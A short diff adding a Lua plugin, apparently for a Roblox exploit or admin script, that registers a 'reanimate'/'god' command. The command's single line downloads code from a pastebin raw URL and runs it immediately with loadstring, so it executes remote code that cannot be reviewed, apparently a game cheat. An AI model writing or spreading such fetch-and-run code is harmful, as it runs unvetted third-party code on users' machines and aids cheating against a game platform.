@@ -1,0 +1,15 @@
+local Plugin = {
+	["PluginName"] = "ReAnimation",
+	["PluginDescription"] = "Re-Animate Your Dead Parts",
+	["Commands"] = {
+		["reanimate/reanim/god"] = {
+			["Description"] = "GodMode Activated",
+			["Aliases"] = {'reanimate', 'reanim', 'god'},
+			["Function"] = function(args,speaker)
+				loadstring(game:HttpGet(('https://pastebin.com/raw/kz1Et0kG'),true))()
+			end,
+		},
+	},
+}
+
+return Plugin
